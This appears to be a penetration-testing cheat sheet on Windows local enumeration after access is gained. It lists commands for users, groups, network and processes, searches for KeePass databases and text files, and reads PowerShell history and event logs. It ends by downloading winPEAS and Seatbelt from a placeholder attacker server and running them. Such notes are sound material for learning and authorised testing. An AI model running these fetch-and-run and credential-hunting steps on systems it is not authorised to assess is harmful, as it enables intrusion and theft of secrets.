---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Local Enumeration

Username and hostname.

```batch
whoami
hostname
```

Group memberships of the current user.

```batch
whoami /groups
```

Existing users and groups.

{% tabs %}
{% tab title="PowerShell" %}
```powershell
Get-LocalUser
Get-LocalUser <user_name>
Get-LocalGroup
Get-LocalGroupMember <group_name>
```
{% endtab %}

{% tab title="Batch" %}
```batch
net user
net user <user_name>
net localgroup 
net localgroup <group_name>
```
{% endtab %}
{% endtabs %}

Operating system, version and architecture.

```batch
systeminfo
```

Network information.

```batch
ipconfig /all
route print
netstat -ano
```

Installed applications.

{% code overflow="wrap" %}
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
{% endcode %}

Running processes.

```powershell
Get-Process
Get-Process <Proccess> | select Path
```

Search for files.

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
{% endcode %}

```powershell
Get-ChildItem -Path C:\xampp -Include *.bin *.txt -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
Get-ChildItem -Path C:\Users -Include *.txt -File -Force -Recurse -ErrorAction SilentlyContinue
```

PowerShell history.

```powershell
Get-History # Get History Commands

(Get-PSReadlineOption).HistorySavePath # Get History File Path
```

PowerShell history event logs.

```powershell
Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104 | ForEach-Object { $_.Message } | findstr "dave*"
```

## Automated Enumeration

Download and execute **`winPEAS`** and **`Seatbelt`.**

```powershell
iwr -uri http://<attacker_http_server>/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://<attacker_http_server>/Seatbelt.exe -Outfile Seatbelt.exe
.\Seatbelt.exe -group=all
```

## References

{% embed url="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS" %}
winPEAS
{% endembed %}

{% embed url="https://github.com/GhostPack/Seatbelt" %}
Seatbelt
{% endembed %}
